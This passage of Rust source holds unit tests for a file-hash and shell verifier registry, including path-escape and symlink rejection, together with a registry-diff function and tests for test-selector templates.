        let plain = VerifierSpec::shell("true");
        let ev2 = run_spec(
            "c",
            "k",
            &plain,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert!(ev2.expires_at.is_none());
    }

    #[test]
    fn file_hash_adapter_matches_and_mismatches() {
        let d = tmp("filehash");
        std::fs::write(d.join("artifact.bin"), b"contents").unwrap();
        let good = sha256_hex(b"contents");
        let s_ok = file_hash_spec("artifact.bin", &good);
        let ev = run_spec(
            "c",
            "k",
            &s_ok,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(ev.state, EvidenceState::Valid);
        assert_eq!(ev.producer, "file-hash-verifier");
        assert!(ev.command.starts_with("file-hash:"));
        let s_bad = file_hash_spec("artifact.bin", &sha256_hex(b"tampered"));
        let ev2 = run_spec(
            "c",
            "k",
            &s_bad,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(ev2.state, EvidenceState::Invalid);
        assert!(
            ev2.output_excerpt.contains("MISMATCH"),
            "{}",
            ev2.output_excerpt
        );
        let s_missing = file_hash_spec("absent.bin", &good);
        let ev3 = run_spec(
            "c",
            "k",
            &s_missing,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(ev3.state, EvidenceState::Invalid);
        assert!(ev3.output_excerpt.contains("MISSING"));
    }

    #[test]
    fn file_hash_without_files_glob_is_still_bound_to_expected_content() {
        let d = tmp("file-hash-inferred-watch");
        std::fs::write(d.join("invoice.csv"), "invoice,v1").unwrap();
        let mut s = file_hash_spec("invoice.csv", &sha256_hex(b"invoice,v1"));
        s.files.clear(); // Table-form expect_sha256 permits omitting files.
        let evidence = run_spec(
            "invoice",
            "owner.sha",
            &s,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(evidence.state, EvidenceState::Valid);
        assert!(
            !evidence.artifact_hash.is_empty(),
            "hash evidence must bind the file"
        );
        assert!(evidence.artifact_files.contains_key("invoice.csv"));
        std::fs::write(d.join("invoice.csv"), "invoice,v2").unwrap();
        assert_ne!(artifact_hash(&s, &d).unwrap(), evidence.artifact_hash);
    }

    #[test]
    fn file_hash_rejects_parent_directory_escape_even_if_digest_matches() {
        let d = tmp("file-hash-parent-escape");
        let external = d
            .parent()
            .unwrap()
            .join(format!("uni-external-hash-{}", std::process::id()));
        std::fs::write(&external, "outside owner workspace").unwrap();
        let rel = format!("../{}", external.file_name().unwrap().to_string_lossy());
        let mut s = file_hash_spec(&rel, &sha256_hex(b"outside owner workspace"));
        s.files.clear();
        let outcome = FileHashVerifier.run(&s, &d).unwrap();
        assert_eq!(outcome.state, EvidenceState::Invalid);
        std::fs::remove_file(external).unwrap();
    }

    #[test]
    fn file_hash_rejects_absolute_paths_even_if_digest_matches() {
        let d = tmp("file-hash-absolute");
        let absolute = d.join("owned.txt");
        std::fs::write(&absolute, "safe").unwrap();
        let mut s = file_hash_spec(&absolute.to_string_lossy(), &sha256_hex(b"safe"));
        s.files.clear();
        let outcome = FileHashVerifier.run(&s, &d).unwrap();
        assert_eq!(outcome.state, EvidenceState::Invalid);
    }

    #[cfg(unix)]
    #[test]
    fn file_hash_rejects_symlink_even_when_it_points_inside_workspace() {
        use std::os::unix::fs::symlink;
        let d = tmp("file-hash-symlink");
        std::fs::write(d.join("owned.txt"), "safe").unwrap();
        symlink(d.join("owned.txt"), d.join("alias.txt")).unwrap();
        let mut s = file_hash_spec("alias.txt", &sha256_hex(b"safe"));
        s.files.clear();
        let outcome = FileHashVerifier.run(&s, &d).unwrap();
        assert_eq!(outcome.state, EvidenceState::Invalid);
    }
    #[test]
    fn registry_parses_file_hash_kind() {
        let d = tmp("reg-fh");
        std::fs::write(
            d.join(".uni/config.toml"),
            "[verifiers.\"wasm\"]\ntype = \"file-hash\"\nfiles = [\"dist/app.wasm\"]\nexpect_sha256 = \"deadbeef\"\n",
        )
        .unwrap();
        let r = load_registry(&d.join(".uni"));
        assert_eq!(r["wasm"].kind, "file-hash");
        assert_eq!(r["wasm"].expect_sha256["dist/app.wasm"], "deadbeef");
    }

    #[test]
    fn unknown_verifier_type_is_hard_error() {
        let mut s = VerifierSpec::shell("true");
        s.kind = "wasm-magic".into();
        let err = match verifier_for(&s) {
            Ok(_) => panic!("unknown type must fail"),
            Err(e) => e.to_string(),
        };
        assert!(err.contains("unknown verifier type"), "{err}");
    }

    #[test]
    fn non_shell_verifier_refuses_inline_override() {
        let d = tmp("inline-fh");
        std::fs::write(
            d.join(".uni/config.toml"),
            "[verifiers.\"wasm\"]\ntype = \"file-hash\"\nfiles = [\"a\"]\nexpect_sha256 = \"b\"\n",
        )
        .unwrap();
        let r = load_registry(&d.join(".uni"));
        let err = resolve_command("wasm", Some("true"), &r)
            .unwrap_err()
            .to_string();
        assert!(err.contains("inline overrides are refused"), "{err}");
    }

    #[cfg(not(windows))]
    #[test]
    fn fast_verifier_passes_with_exit_zero() {
        let d = tmp("fast");
        let (code, _) = run_shell("true", &d, 30).unwrap();
        assert_eq!(code, 0);
    }
}

/// Trust-boundary diff (B2): compare two registry texts key by key.
/// Used to name which verifiers changed between the acknowledged registry
/// snapshot and the current one. Pure function, fully unit-tested.
/// `[identities]` is part of the same trust root, so its moves are named too
/// (prefixed `identity:`): an issuer-only change would otherwise report
/// REGISTRY_CHANGED with an empty diff.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct RegistryDiff {
    pub added: Vec<String>,
    pub removed: Vec<String>,
    pub changed: Vec<String>,
}

fn named_table(text: &str, name: &str) -> toml::map::Map<String, toml::Value> {
    text.parse::<toml::Value>()
        .ok()
        .and_then(|v| v.get(name).cloned())
        .and_then(|v| v.as_table().cloned())
        .unwrap_or_default()
}

fn diff_table(
    old: &toml::map::Map<String, toml::Value>,
    new: &toml::map::Map<String, toml::Value>,
    prefix: &str,
) -> RegistryDiff {
    let mut diff = RegistryDiff::default();
    for k in new.keys() {
        if !old.contains_key(k) {
            diff.added.push(format!("{prefix}{k}"));
        } else if old.get(k) != new.get(k) {
            diff.changed.push(format!("{prefix}{k}"));
        }
    }
    for k in old.keys() {
        if !new.contains_key(k) {
            diff.removed.push(format!("{prefix}{k}"));
        }
    }
    diff
}

pub fn registry_diff(old_text: &str, new_text: &str) -> RegistryDiff {
    let mut diff = diff_table(
        &named_table(old_text, "verifiers"),
        &named_table(new_text, "verifiers"),
        "",
    );
    let identities = diff_table(
        &named_table(old_text, "identities"),
        &named_table(new_text, "identities"),
        "identity:",
    );
    diff.added.extend(identities.added);
    diff.removed.extend(identities.removed);
    diff.changed.extend(identities.changed);
    diff.added.sort();
    diff.removed.sort();
    diff.changed.sort();
    diff
}

#[cfg(test)]
mod registry_diff_tests {
    use super::*;

    #[test]
    fn diff_names_added_removed_changed() {
        let old = "[verifiers]\n\"a\" = \"true\"\n\"b\" = \"false\"\n\"c\" = \"true\"\n";
        let new = "[verifiers]\n\"a\" = \"true\"\n\"b\" = \"true\"\n\"d\" = \"true\"\n";
        let d = registry_diff(old, new);
        assert_eq!(d.added, vec!["d".to_string()]);
        assert_eq!(d.removed, vec!["c".to_string()]);
        assert_eq!(d.changed, vec!["b".to_string()]);
    }

    #[test]
    fn diff_empty_on_identical() {
        let t = "[verifiers]\n\"a\" = \"true\"\n";
        assert_eq!(registry_diff(t, t), RegistryDiff::default());
    }

    #[test]
    fn diff_table_form_compares_fields() {
        let old = "[verifiers.\"x\"]\nrun = \"a\"\nexpect = \"1\"\n";
        let same = "[verifiers.\"x\"]\nrun = \"a\"\nexpect = \"1\"\n";
        let other = "[verifiers.\"x\"]\nrun = \"a\"\nexpect = \"2\"\n";
        assert!(registry_diff(old, same).changed.is_empty());
        assert_eq!(registry_diff(old, other).changed, vec!["x".to_string()]);
    }

    #[test]
    fn diff_names_identity_changes() {
        // A registry edit that only touches who may be believed must still be
        // named: an issuer added, a key material change, an issuer dropped.
        let old = "[verifiers]\n\"a\" = \"true\"\n\n[identities.\"https://one\"]\njwks_file = \"one.jwks.json\"\n";
        let new = "[verifiers]\n\"a\" = \"true\"\n\n[identities.\"https://one\"]\njwks_file = \"rotated.jwks.json\"\n\n[identities.\"https://two\"]\njwks_file = \"two.jwks.json\"\n";
        let d = registry_diff(old, new);
        assert_eq!(d.added, vec!["identity:https://two".to_string()]);
        assert_eq!(d.changed, vec!["identity:https://one".to_string()]);
        assert!(d.removed.is_empty());

        let removed = registry_diff(new, old);
        assert_eq!(removed.removed, vec!["identity:https://two".to_string()]);

        // Identical registries, identities included: nothing to report.
        assert_eq!(registry_diff(new, new), RegistryDiff::default());
    }
}

#[cfg(test)]
mod selector_tests {
    use super::*;

    fn tpl() -> VerifierSpec {
        let mut s = VerifierSpec::shell("cargo test {{selector}} -- --exact");
        s.expect = "test result: ok. 1 passed".into();
        s
    }

    #[test]
    fn template_detection_and_substitution() {
        let t = tpl();
        assert!(is_selector_template(&t));
        assert!(!is_selector_template(&VerifierSpec::shell("cargo test")));
        let resolved = with_selector(&t, Some("cancel_ok")).unwrap();
        assert_eq!(resolved.run, "cargo test cancel_ok -- --exact");
        assert!(!is_selector_template(&resolved));
    }

    #[test]
    fn pinned_names_detected_suites_not() {
        // The study's false-rejection class: a literal test name in the run.
        assert!(pinned_test_selector(&VerifierSpec::shell(
            "cargo test add_works -- --exact"
        )));
        assert!(pinned_test_selector(&VerifierSpec::shell(
            "node --test --test-name-pattern \"spaces become dashes\" x.test.mjs"
        )));
        assert!(pinned_test_selector(&VerifierSpec::shell(
            "python3 -m unittest test_pricing.Pricing.test_floor"
        )));
        // Suites, targets, templates, and non-shell verifiers are not pinned.
        assert!(!pinned_test_selector(&VerifierSpec::shell("cargo test")));
        assert!(!pinned_test_selector(&VerifierSpec::shell(
            "cargo test --test invariants"
        )));
        assert!(!pinned_test_selector(&VerifierSpec::shell(
            "python3 -m unittest discover -p 'test_*.py'"
        )));
        assert!(!pinned_test_selector(&tpl()));
        assert!(!pinned_test_selector(&VerifierSpec::shell("true")));
    }

    #[test]
    fn template_without_selector_is_a_hard_error() {
        let t = tpl();
        let err = match with_selector(&t, None) {
            Ok(_) => panic!("must refuse"),
            Err(e) => e.to_string(),
        };
        assert!(err.contains("selector template"), "{err}");
        assert!(with_selector(&t, Some("  ")).is_err());
        // non-template verifiers pass through untouched
        let plain = VerifierSpec::shell("true");
        assert!(with_selector(&plain, None).is_ok());
    }

    #[test]
    fn selector_changes_the_cache_fingerprint() {
        let a = with_selector(&tpl(), Some("test_a")).unwrap();
        let b = with_selector(&tpl(), Some("test_b")).unwrap();
        assert_ne!(
            spec_fingerprint("k", &a, "alice"),
            spec_fingerprint("k", &b, "alice"),
            "two selectors on the same key must not share evidence"
        );
    }
}
